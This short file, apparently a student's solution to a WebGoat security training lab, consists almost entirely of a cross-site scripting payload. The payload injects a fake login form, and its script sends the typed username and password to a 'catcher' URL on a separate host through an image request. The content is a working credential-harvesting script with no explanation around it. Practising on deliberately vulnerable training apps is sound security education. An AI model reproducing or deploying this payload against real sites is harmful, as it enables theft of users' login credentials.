# sungshin
<script> 
function login() { 
var xssImg = new Image; 
xssImg.src = 'http://192.168.184.130:8080/WebGoat/catcher?PROPERTY=yes&user=' + this.form.username.value + '&password=' + this.form.password.value; 
alert('username = ' + this.form.username.value + ' password = ' + this.form.password.value); 
} 

</script> 
Login <br>Username : <input type="text" name="username"><br> Password : <input type="password" name="password"><br><input type="submit" value="login" onclick=login()> 

